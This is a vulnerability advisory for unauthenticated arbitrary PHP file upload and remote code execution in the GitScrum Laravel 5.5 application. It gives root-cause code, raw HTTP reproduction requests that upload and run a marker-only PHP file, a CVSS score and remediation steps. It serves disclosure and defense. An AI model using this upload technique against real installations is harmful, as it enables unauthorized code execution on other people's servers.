# GitScrum Arbitrary File Upload Remote Code Execution (Laravel 5.5)

> ⚠️ **COVERED / 勿提交**: 在先公开披露——gitscrum-core/laravel-gitscrum issue #369(2026-03-04, 15 findings 含本洞: attachments 路由无鉴权+无类型校验+原扩展名落盘 RCE),CSRF 部分更早见 issue #354(2021-12-07, huntr.dev);厂商 renatomarinho 已公开声明仓库弃维、'known and won't be patched'。本目录仅作研究存档,不提交 VulDB。
**CWE-434 · Unauthenticated unrestricted file upload · Arbitrary PHP code execution on default installations**

> **Vendor:** laravel (https://github.com/laravel)
> **Product:** GitScrum (Laravel 5.5 monolith, https://github.com/laravel/gitscrum)
> **Affected version:** master branch, latest as of 2026-09-27; no fixed release (Laravel framework 5.5.x per composer.lock)
> **Affected endpoints:** POST /attachments/store (multipart/form-data, field `attachment`)
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Validation used only a harmless md5 marker payload; no credentials were extracted, and no sensitive values appear in this disclosure.

## 1. Summary

GitScrum's attachment upload endpoint `POST /attachments/store` is registered without authentication middleware and without CSRF protection, and its form request authorizes every caller while validating nothing beyond field presence. The stored filename keeps the client-supplied extension verbatim (`time().'.'.getClientOriginalExtension()`) and the file is moved into `public_path('attachments')` inside the web root. As a result, any unauthenticated remote attacker can upload a `.php` file and immediately execute it as PHP, achieving remote code execution on a default installation.

## 2. Root Cause

| File | Line | Role |
|---|---|---|
| `routes/web.php` | 110-113 | `attachments` route group registered **without** the `user.authenticated` middleware used by every other state-changing group |
| `app/Http/Kernel.php` | `web` group | No `VerifyCsrfToken`; the class does not exist anywhere in the codebase (CSRF protection removed app-wide) |
| `app/Http/Requests/AttachmentRequest.php` | 14-28 | `authorize()` returns `true`; rules are only `['attachment' => 'required']` — no `file`, `mimes`, extension or size checks |
| `app/Services/AttachmentService.php` | 19 | `$attachmentName = time().'.'.$request->attachment->getClientOriginalExtension();` — extension is 100% client-controlled |
| `app/Services/AttachmentService.php` | 30 | `$request->attachment->move($this->getAttachmentFolder(), $attachmentName);` — writes into `public_path('attachments')`, inside the web root |

```php
// app/Services/AttachmentService.php:19-30
$attachmentName = time().'.'.$request->attachment->getClientOriginalExtension();
// ...
$request->attachment->move($this->getAttachmentFolder(), $attachmentName); // public_path('attachments')
```

## 3. Prerequisites

- None. No authentication, no session, no CSRF token, no user interaction.
- Default installation with `public/` served as the web root and PHP enabled.
- The uploaded filename is `time().'.'.$ext`, so the exact URL is predictable from the upload timestamp.

## 4. Reproduction

```http
POST /attachments/store HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----poc

------poc
Content-Disposition: form-data; name="attachment"; filename="poc.php"
Content-Type: application/octet-stream

<?php echo "GITSCRUM-01-TEST-".md5("poc");
------poc--
```

```http
GET /attachments/1790538056.php HTTP/1.1
Host: target
```

```http
HTTP/1.1 200 OK

GITSCRUM-01-TEST-302fac1d6d73cf4fdf2c9919195df864
```

`md5("poc")` = `302fac1d6d73cf4fdf2c9919195df864` — marker matches, uploaded PHP executed. Scripted PoC: `poc/exploit.sh` (payload: `poc/poc.php`). Raw verification transcript: `evidence/GITSCRUM-01.txt`.

## 5. Confirmed Techniques

- Unauthenticated `curl -F` multipart upload (no cookie, no CSRF token) stored `public/attachments/<timestamp>.php`; extension preserved verbatim.
- `GET` of the stored file returned the marker `GITSCRUM-01-TEST-302fac1d6d73cf4fdf2c9919195df864` = `md5("poc")`.
- `artisan route:list`: middleware `web` only; no `VerifyCsrfToken` class exists in the codebase; `AttachmentRequest::authorize()` hardcodes `true` with rules `attachment => required`.
- Upload POST returns HTTP 500 after `move()` (AttachmentObserver dereferences the null `Auth::user()`), but the executable file persists on disk — the RCE requires no account.

## 6. Impact

Unauthenticated remote code execution with the privileges of the web server user on any default installation: complete loss of confidentiality, integrity and availability of the application host. Uploaded executables are trivially locatable by timestamp prefix.

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (Base 9.8 — Critical)

## 8. Remediation

1. Add the `user.authenticated` middleware to the `attachments` route group.
2. Validate uploads with a strict whitelist: `required|file|mimes:jpg,jpeg,png,gif,pdf,zip|max:<sane limit>`.
3. Derive the stored extension from the server-side whitelist instead of `getClientOriginalExtension()`.
4. Store uploads outside the public web root and serve via a controller with sanitised headers; disable PHP execution in upload directories at the web-server level.
5. Restore app-wide CSRF protection for state-changing routes.

## 9. References

- Project: https://github.com/laravel/gitscrum
- CWE-434: https://cwe.mitre.org/data/definitions/434.html
- External disclosure: https://gist.github.com/qianqiusujiu/18e74615271f9b013fb22ed2f814d283
- VulDB submission #xxxxxx

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
